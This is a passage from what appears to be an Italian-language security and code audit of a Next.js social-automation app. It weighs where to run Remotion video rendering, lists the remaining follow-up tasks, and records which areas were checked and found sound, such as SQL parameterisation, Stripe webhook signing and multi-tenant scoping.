| **Tutto su container**, abbandonando Vercel | Coerente con `render-start.mjs`, `prod:check`, README già presenti nel repo | Si perdono edge/ISR di Vercel; il repo sembra già scritto per questo |
| **Servizio di rendering gestito** (Remotion Lambda, Shotstack, Creatomate) | Remotion Lambda è la modalità supportata da Remotion per il serverless | Costo per render; Remotion Lambda richiede AWS proprio, non Vercel |
| **Rimuovere Remotion**, tornare a Blotato per il montaggio | `lib/blotato-visual.ts` esiste già e i suoi test passano | Si perde il controllo sulla resa premium che motivava il cambio |

Finché la scelta non è presa, A3 (cap durata, `maxDuration`, render fuori request) e A2 (rowcount del lock) restano comunque da sistemare in qualsiasi scenario.

---

## Checklist azioni immediate, in ordine

`npm ci`, `npm test` e la migration 044 in produzione sono già stati fatti. Tutti i bug dell'audit sono chiusi. Resta:

1. **C1 — decidere dove far girare Remotion.** È l'unica voce aperta e blocca il completamento di A3 (render sincrono dentro la request, loop seriale, `readFile` dell'intero MP4): quei tre punti si risolvono in modo diverso a seconda dell'architettura scelta. Le opzioni sono nella sezione qui sotto.
2. **M4 — decidere se rimuovere `lib/blotato-visual.ts`**, oggi senza chiamanti. I suoi difetti sono corretti, quindi non è urgente: è una pulizia.
3. **Verificare a runtime i due fix di sicurezza non provabili staticamente**: un upload presigned reale contro Supabase (il Content-Type ora è firmato: un mismatch darebbe 403 sul PUT) e il flow OAuth Meta end-to-end.
4. **Controllare `ALLOWED_HOSTS` prima del prossimo deploy**: se l'app risponde sia su `www.socialautomation.app` sia sull'apex, quello non presente in `NEXT_PUBLIC_SITE_URL`/`NEXTAUTH_URL` va aggiunto, altrimenti gli URL generati ripiegano sulla env invece di usare l'host della richiesta.
5. **Alzare `LATEST_REQUIRED_MIGRATION`** in `app/api/system/health/route.ts` a `044_campaign_folder_import.sql` quando si vuole che l'health check la pretenda.

**Da rivedere prima del commit:** tutti i fix di questa sessione sono nel working tree, non committati.

---

## Verificato e sano — non toccare

Elencato per evitare lavoro inutile o regressioni:

- **SQL injection: nessuna.** Query tutte parametrizzate. Le interpolazioni in `data/calendario/route.ts:166,269`, `data/clienti/route.ts:118`, `data/brand/route.ts:111` passano da whitelist `Set` di colonne; `data/token-usage/route.ts:36-40` interpola una costante letterale.
- **Webhook Stripe**: firma HMAC + tolleranza timestamp verificate correttamente (`lib/stripe.ts:272-297`, chiamato in `app/api/stripe/webhook/route.ts:483`).
- **Nessun segreto hardcoded o loggato.** File env tracciati: solo `.env.example` e `.env.local.example`. `.gitignore` copre `.env.local`, `.env.*.local`, `*.env`, `env.download`, `.vercel`.
- **Path traversal in `campaign-folder.ts`: assente.** `parseCampaignFolderFile` gira solo lato client (`piano/page.tsx:231`), non tocca il filesystem, e il nome per l'upload è rigenerato da `folderUploadName`. Il proxy asset valida i segmenti con `safeSegment`.
- **Hash Remotion coerente** tra `schedule.ts:247-254` e `remotion-renderer.ts:99-109`: gli input divergenti si normalizzano allo stesso valore. Il confronto `storedSourceHash === sourceHash` è corretto.
- **Loop di approvazione** visual_review → APPROVATO: chiuso correttamente da `data/calendario/route.ts:234-247`.
- **`import { test } from 'playwright/test'` è corretto.** `@playwright/test` non è installato, ma il pacchetto `playwright` espone il subpath `./test` che re-esporta il runner. Verificato: `npx playwright test --list lib/blotato-visual.test.ts` elenca i test. (Nota: non esiste `playwright.config.ts`, si usano i default.)
- **Config di build pulite.** Nessun `typescript.ignoreBuildErrors` né `eslint.ignoreDuringBuilds`. `tsconfig.json` ha `"strict": true`.
- **Scoping multi-tenant corretto** in `calendario/[id]/regenerate`, `sync-uno`, `leads`, `prodotti`, `blog`, `backup`, `settings`. Token gating corretto in `/api/data/approve` e `/api/data/preview`. Doppia auth cron/admin degli agenti fail-closed (`lib/cron-auth.ts:19`). Webhook Blotato con HMAC fail-closed. `/api/recesso` hardenato (origin check, content-type, honeypot, Turnstile).
- **`formato`/`canale` null**: impossibili, entrambe `not null` in `001_full_schema.sql:167-168`.
